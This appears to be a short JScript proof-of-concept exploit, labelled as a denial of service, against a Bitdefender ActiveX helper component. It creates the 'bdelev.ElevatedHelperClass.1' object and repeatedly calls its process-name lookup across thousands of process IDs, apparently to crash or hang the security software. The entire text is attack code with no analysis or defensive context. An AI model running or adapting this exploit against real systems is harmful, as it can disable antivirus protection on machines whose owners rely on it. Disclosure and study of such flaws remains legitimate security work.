// POC (DOS)
this.bitdefender = new ActiveXObject('bdelev.ElevatedHelperClass.1');
for (pid=0; pid<4000; pid+=4)
{
try
{
var Module_Path = bitdefender.Proc_GetName_PSAPI (pid);
}
catch(e) {}
CollectGarbage();
}
